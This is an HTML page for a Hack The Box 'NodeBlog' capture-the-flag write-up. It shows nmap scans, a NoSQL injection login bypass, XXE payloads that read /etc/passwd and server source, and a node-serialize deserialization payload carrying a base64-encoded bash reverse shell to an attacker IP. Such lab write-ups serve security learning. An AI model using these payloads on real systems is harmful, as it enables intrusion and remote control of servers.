@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB NodeBlog Writeup | Diego Chávez</title>
+    <link rel="stylesheet" href="../../styles/global.css" />
+    <link rel="stylesheet" href="../../styles/button.css" />
+    <link rel="stylesheet" href="../../styles/about.css" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://api.iconify.design/simple-icons:hackthebox.svg?color=%23ff0000"
+    />
+    <style>
+      .writeup-img {
+        width: 100%;
+        max-width: 800px;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(89, 249, 255, 0.2);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        margin: 12px 0;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="content-wrapper" style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+      
+      <!-- ENCABEZADO Y ETIQUETAS -->
+      <section class="hero" style="text-align: left; margin-bottom: 40px;">
+        <h1 style="color: var(--link-hover-color); font-size: 2.3rem; margin-bottom: 10px;">HTB: NodeBlog</h1>
+        
+        <div class="tags" style="margin: 15px 0; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span style="background: rgba(255,165,0,0.2); color: #ffa500; border: 1px solid rgba(255, 165, 0, 0.3); padding: 4px 10px; border-radius: 5px; font-size: 0.85rem; font-weight: bold;">#Medium</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#NoSQLI</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#xxe</span>
+        </div>
+      </section>
+
+      <!-- CONTENIDO DEL WRITEUP -->
+      <article class="writeup-body" style="line-height: 1.8; color: #e2e8f0; display: flex; flex-direction: column; gap: 25px;">
+        
+        <div class="step-card" style="background: rgba(22, 2, 61, 0.4); padding: 25px; border-radius: 12px; border: 1px solid rgba(89, 249, 255, 0.15);">
+          
+          <p>First, we perform an open port scan using Nmap:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.129.96.160 -oG allPorts</code></pre>
+          <p style="margin-top: 10px;">We discover open ports 22 (SSH) and 5000 (HTTP):</p>
+          <img src="./images/Pasted image 20260503144516.png" alt="Open Ports Scan Output" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Next, we launch service enumeration scripts against the open ports:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -sCV -p22,5000 10.129.96.160 -oN targeted</code></pre>
+          <p style="margin-top: 10px;">Service detection results:</p>
+          <img src="./images/Pasted image 20260503144751.png" alt="Targeted Nmap Scan Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Browsing the web application on port 5000:</p>
+          <img src="./images/Pasted image 20260503144854.png" alt="NodeBlog Landing Page" class="writeup-img" />
+          <p style="margin-top: 10px;">Fingerprinting with <code>whatweb</code> reveals that the application runs on Node.js.</p>
+
+          <p style="margin-top: 15px;">Navigating to the Login page:</p>
+          <img src="./images/Pasted image 20260503145127.png" alt="Login Interface" class="writeup-img" />
+          <p style="margin-top: 10px;">Single quote injection yields no error, pointing towards NoSQL injection techniques.</p>
+
+          <p style="margin-top: 15px;">We intercept the login request in CAIDO:</p>
+          <img src="./images/Pasted image 20260503145720.png" alt="CAIDO Intercept Login Request" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Testing NoSQL payloads using reference vectors (e.g., PayloadsAllTheThings):</p>
+          <img src="./images/Pasted image 20260503145842.png" alt="NoSQL Payload Construction" class="writeup-img" />
+          <p style="margin-top: 10px;">Using the <code>[$ne]</code> operator bypasses password equality checks, returning an HTTP 200 OK status:</p>
+          <img src="./images/Pasted image 20260503145954.png" alt="NoSQL 200 OK Response" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Converting the request body to JSON format:</p>
+          <img src="./images/Pasted image 20260503150604.png" alt="JSON NoSQL Payload Request" class="writeup-img" />
+          <p style="margin-top: 10px;">Viewing the response in the browser confirms administrator session access:</p>
+          <img src="./images/Pasted image 20260503150644.png" alt="Admin Dashboard Session Granted" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Inside the administrator panel, an Upload feature accepts XML post definitions with the following structure:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">&lt;post&gt;&lt;title&gt;Example Post&lt;/title&gt;&lt;description&gt;Example Description&lt;/description&gt;&lt;markdown&gt;Example Markdown&lt;/markdown&gt;&lt;/post&gt;</code></pre>
+
+          <p style="margin-top: 15px;">We craft an XXE (XML External Entity) payload to read local files:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;post&gt;
+  &lt;title&gt;Example Post&lt;/title&gt;
+  &lt;description&gt;Example Description&lt;/description&gt;
+  &lt;markdown&gt;&amp;xxe;&lt;/markdown&gt;
+&lt;/post&gt;</code></pre>
+          <p style="margin-top: 10px;">The server responds with the contents of <code>/etc/passwd</code>:</p>
+          <img src="./images/Pasted image 20260503152218.png" alt="XXE Local File Read - /etc/passwd" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We query internal open ports via XXE by reading <code>/proc/net/tcp</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///proc/net/tcp"&gt;
+]&gt;
+&lt;post&gt;
+  &lt;title&gt;Example Post&lt;/title&gt;
+  &lt;description&gt;Example Description&lt;/description&gt;
+  &lt;markdown&gt;&amp;xxe;&lt;/markdown&gt;
+&lt;/post&gt;</code></pre>
+          <p style="margin-top: 10px;">Raw hexadecimal TCP socket data returned:</p>
+          <img src="./images/Pasted image 20260503152623.png" alt="Proc Net TCP Raw Output" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We decode the hexadecimal port numbers using a bash loop:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">for port in $(cat data | awk '{print $2}' | grep -v "local" | awk 'NF{print $NF}' FS=":" | sort -u); do echo "[^^] Port -&gt; $(echo "obase=10; ibase=16; $port" | bc)"; done</code></pre>
+          <p style="margin-top: 10px;">Decoded active internal listening ports:</p>
+          <img src="./images/Pasted image 20260503153757.png" alt="Decoded Active Internal Ports" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Triggering intentional JSON parsing errors leaks application stack traces and absolute file paths:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">SyntaxError: Unexpected token { in JSON at position 29
+    at JSON.parse (&lt;anonymous&gt;)
+    at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)
+    at /opt/blog/node_modules/raw-body/index.js:273:7</code></pre>
+
+          <p style="margin-top: 15px;">Using XXE, we read the main backend application source code at <code>/opt/blog/server.js</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///opt/blog/server.js"&gt;
+]&gt;
+&lt;post&gt;
+  &lt;title&gt;Example Post&lt;/title&gt;
+  &lt;description&gt;Example Description&lt;/description&gt;
+  &lt;markdown&gt;&amp;xxe;&lt;/markdown&gt;
+&lt;/post&gt;</code></pre>
+
+          <p style="margin-top: 10px;">The application uses <code>node-serialize</code> to process session cookies:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">const serialize = require('node-serialize')
+const cookie_secret = "UHC-SecretCookie"
+
+function authenticated(c) {
+    if (typeof c == 'undefined') return false
+    c = serialize.unserialize(c)
+    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
+        return true
+    } else {
+        return false
+    }
+}</code></pre>
+
+          <p style="margin-top: 15px;">We construct a serialized IIFE payload to achieve Remote Code Execution through insecure deserialization:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.16.167 ',function(error, stdout, stderr) { console.log(stdout) }); }()"}</code></pre>
+
+          <p style="margin-top: 15px;">We URL-encode the payload and pass it via the cookie header:</p>
+          <img src="./images/Pasted image 20260503160058.png" alt="Serialized Cookie Injection" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Monitoring incoming ICMP traffic using <code>tcpdump</code> verifies code execution:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">tcpdump -i tun0 icmp -n</code></pre>
+          <img src="./images/Pasted image 20260503160508.png" alt="ICMP Echo Request Captured" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We construct a Base64-encoded reverse shell payload:</p>
+          <img src="./images/Pasted image 20260503160827.png" alt="Base64 Reverse Shell Payload" class="writeup-img" />
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNjcvNDQzIDA+JjE= | base64 -d | bash',function(error, stdout, stderr) { console.log(stdout) }); }()"}</code></pre>
+
+          <p style="margin-top: 15px;">Sending the URL-encoded payload via cookie header:</p>
+          <img src="./images/Pasted image 20260503161127.png" alt="URL Encoded RCE Cookie Request" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Reverse shell connection established, granting user flag access:</p>
+          <img src="./images/Pasted image 20260503163501.png" alt="User Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Interacting with the local MongoDB database:</p>
+          <img src="./images/Pasted image 20260503163658.png" alt="MongoDB Connection & Queries" class="writeup-img" />
+          <img src="./images/Pasted image 20260503163814.png" alt="MongoDB Admin Hash Extraction" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Extracting credentials from MongoDB allows switching user context:</p>
+          <img src="./images/Pasted image 20260503163935.png" alt="User Password Verification" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Checking user sudo privileges:</p>
+          <img src="./images/Pasted image 20260503164023.png" alt="Sudo Privileges List" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Elevating privileges to <strong>root</strong> and reading the final flag:</p>
+          <img src="./images/Pasted image 20260503164128.png" alt="Root Flag Retrieval Complete" class="writeup-img" />
+
+        </div>
+
+      </article>
+
+      <!-- BOTONES DE NAVEGACIÓN -->
+      <div class="button-container" style="margin-top: 40px; display: flex; justify-content: center; gap: 15px;">
+        <a href="writeups.html" class="button-33" role="button">Back to Writeups</a>
+        <a href="../../" class="button-33" role="button">Back home</a>
+      </div>
+
+    </main>
+  </body>
+</html>
